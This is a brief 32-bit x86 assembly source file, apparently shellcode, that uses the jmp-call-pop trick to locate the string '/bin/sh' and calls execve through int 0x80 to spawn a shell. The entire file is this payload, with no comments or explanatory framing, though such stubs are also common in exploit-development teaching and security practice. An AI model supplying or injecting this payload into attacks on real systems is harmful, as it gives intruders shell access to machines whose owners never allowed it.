bits 32

section .text

global _start

_start:
    jmp .shell_define
.ret:
    pop ebx
    xor eax, eax
    mov ecx, eax
    mov edx, eax
    mov al, 0x0b
    int 0x80
.shell_define:
    call .ret
    shell db "/bin/sh", 0